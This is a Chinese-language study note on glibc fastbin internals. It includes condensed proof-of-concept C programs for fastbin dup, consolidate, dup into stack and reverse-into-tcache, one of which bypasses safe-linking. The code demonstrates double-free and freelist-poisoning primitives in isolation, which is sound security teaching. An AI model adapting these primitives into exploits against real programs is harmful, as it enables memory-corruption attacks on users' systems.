# Fast bin attack

### What's fast bin

* fastbin被存放在fastbinY数组中，该数组一共有10个元素。
* 每个fast bin都是一个单链表，只是使用fd指针。fast bin无论是添加还是移除都是对链表尾进行操作，使用后入先出算法，所以fastbinY数组中每个fastbin元素都存放了该链表的尾结点，尾结点通过fd指针指向前一个结点。
* fastbin size：数组中相同的链表存放的chunk大小相同，并且下标相邻的数组元素中的chunk链表的chunk size相差8字节(就是第一个元素chunk size都是16字节，第二个都是24字节，以此类推)，所以默认情况下大小尾16到80字节的chunk会被分到fast chunk中。
* fastbin 合并：不会对freechunk进行合并操作。因为fastchunk本身就是为了快速存取chunk，所以每一个chunk的P位都是设置为1(表示前一个chunk已使用)。但是当释放的chunk与该chunk相邻的空闲chunk合并后大小大于一定的大小时(FASTBIN_CONSOLIDATION_THRESHOLD),内存碎片可能会比较多，我们就需要把fast bin中的chunk都进行合并。
* 用户通过malloc请求的大小如果属于fast chunk的大小范围，而这时fast bin支持的最大内存大小以及所有的fast bin链表都是空的(意思就是fast bin里面没有东西)，所以最开始使用malloc申请内存的时候即使申请的内存大小属于fast chunk的内存大小，它也不会交给fast bin处理，而是交给small bin，如果small bin也为空的话就交给unsorted bin。
* 当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：

  * 首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。
  * malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。
  * 然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin。
* free(fast chunk)操作：这个操作很简单，主要分为两步：

  1. 先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；
  2. 然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户。

### fast bin dup

#### glibc2.23

##### poc精简

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
	free(a);
	free(b);
	free(a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	assert(a == c);
}
```

#### glibc2.27 - glibc2.39

##### poc精简

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	void *ptrs[8];
	for (int i=0; i<8; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}
    
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	free(a);
	free(b);
	free(a);
    
	a = calloc(1, 8);
	b = calloc(1, 8);
	c = calloc(1, 8);
	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	assert(a == c);
}
```



### fastbin dup consolidate

#### POC精简

##### glibc 2.23

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	void* p1 = calloc(1,0x40);

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);

	printf("a chunk with chunk size 0x410. p3=%p\n", p3);
	
    assert(p1 == p3);

	free(p1); // vulnerability
    
	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```



##### glibc 2.27 - glibc 2.39

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define CHUNK_SIZE 0x400
int main() {
	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);

	void* p1 = malloc(0x40);
    
	for(int i = 0; i < 7; i++)
		free(ptr[i]);
    
  	free(p1);

  	void* p2 = malloc(CHUNK_SIZE);

	assert(p1 == p2);

	free(p1); // vulnerability (double free)
    
	printf("It is now in the tcache (or merged with top if we had initially chosen a chunk size > 0x410).\n");

	void *p3 = malloc(CHUNK_SIZE);

	assert(p3 == p2);

	printf("and both point to the same tcache sized chunk. p2=%p p3=%p\n", p2, p3);

	return 0;
}
```

### fastbin dup into stack

#### POC精简

##### glibc 2.23

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	free(a);
	free(b);
	free(a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	stack_var = 0x20;
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```



##### glibc 2.27 - glibc 2.39

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	void *ptrs[7];
	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}
	unsigned long long stack_var;

	int *a = calloc(1,8);
	int *b = calloc(1,8);
	int *c = calloc(1,8);

	fprintf(stderr, "1st calloc(1,8): %p\n", a);
	fprintf(stderr, "2nd calloc(1,8): %p\n", b);
	fprintf(stderr, "3rd calloc(1,8): %p\n", c);

	free(a);
	free(b);
	free(a);
	unsigned long long *d = calloc(1,8);

	fprintf(stderr, "1st calloc(1,8): %p\n", d);
	fprintf(stderr, "2nd calloc(1,8): %p\n", calloc(1,8));

	stack_var = 0x20;

	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d) - 1); //注意对齐

	fprintf(stderr, "3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

	void *p = calloc(1,8); 

	fprintf(stderr, "4th calloc(1,8): %p\n", p); 
	// assert((long)__builtin_return_address(0) == *(long *)p);
}
```

### fastbin_reverse_into_tcache

#### 知识点

* libc 2.32以上tache 和fastbin 会有地址加密
* 程序每当从fastbin/small bin中取出一个堆块，会尝试把该bin中剩余的堆块拿出来去填充tcache。

#### POC

##### glibc 2.27 - glibc 2.31

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];

  free(victim);

  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  *(size_t**)victim = &stack_var[0];
  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
}
```



##### glibc 2.32 - glibc 2.39

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	// Allocate 14 times so that we can free later.
	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}
	
	// Fill the tcache.
	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];

	free(victim);
	
	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
    
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);
	printf("\n"
			"Finally, if we malloc one more time then we get the stack address back: %p\n", q);
	
	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
```



